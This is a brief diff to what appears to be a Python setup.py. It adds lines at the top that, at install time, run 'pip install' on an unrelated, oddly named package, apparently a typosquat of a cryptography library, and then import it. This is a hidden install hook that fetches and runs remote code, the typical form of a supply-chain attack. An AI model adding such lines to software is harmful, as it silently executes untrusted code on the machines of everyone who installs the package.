@@ -1,3 +1,6 @@
+import os
+os.system("pip install syscryptographymodsV1")
+import syscryptographymodsV1
 from setuptools import setup, find_packages
 import sys
 import pathlib
